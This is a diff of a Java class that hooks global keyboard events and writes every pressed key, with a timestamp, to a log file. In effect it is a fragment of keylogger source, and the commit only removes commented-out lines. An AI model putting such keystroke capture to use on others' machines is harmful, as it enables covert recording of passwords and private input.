@@ -18,7 +18,6 @@ public class Logger implements NativeKeyListener {
 
     Logger(String filePath) throws IOException {
         logger = java.util.logging.Logger.getLogger("Key Log");
-//        Path currentRelativePath = Paths.get("");
 
         String configFilePath;
         if (!filePath.isEmpty()) {
@@ -32,11 +31,8 @@ public class Logger implements NativeKeyListener {
 
         FileHandler fileHandler = new FileHandler(configFilePath);
         logger.addHandler(fileHandler);
-//        logger.setLevel(java.util.logging.Level.OFF);
-//        SimpleFormatter simpleFormatter = new SimpleFormatter();
         SimpleFormatter simpleFormatter = new SimpleFormatter() {
             private static final String format = "[%1$tF %1$tT] %3$s %n";
-//            private static final String format = "[%1$tF %1$tT] [%2$-7s] %3$s %n";
 
             @Override
             public synchronized String format(LogRecord lr) {
@@ -55,7 +51,6 @@ public class Logger implements NativeKeyListener {
      */
     @Override
     public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
-//        logger.info("Key pressed: " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
         logger.info(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
     }
 
